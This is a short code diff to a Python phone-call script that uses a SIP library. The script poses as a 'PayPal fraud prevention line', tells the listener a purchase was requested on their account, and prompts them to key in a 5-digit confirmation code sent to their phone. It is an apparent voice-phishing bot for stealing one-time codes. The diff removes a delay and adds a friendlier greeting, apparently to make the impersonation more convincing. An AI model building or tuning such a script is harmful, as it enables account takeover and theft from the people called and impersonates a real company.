@@ -4,8 +4,9 @@ from PySIP.call_handler import CallHandler
 async def call_flow(call_handler: CallHandler):
     DELAY_ERR_MESSAGE = "We did no receive any input. Please enter the 5 digit confirmation code we have sent to your number"
     
-    await call_handler.sleep(4)
+    # await call_handler.sleep(4)
     await call_handler.say("Weclome to PayPal fraud prevention line")
+    await call_handler.say("I hope you are doing well today my friend")
     await call_handler.say("we have recently received an online purchase request from your PayPal account. If this was not you press 1")
     dtmf_result = await call_handler.gather_and_say()
 
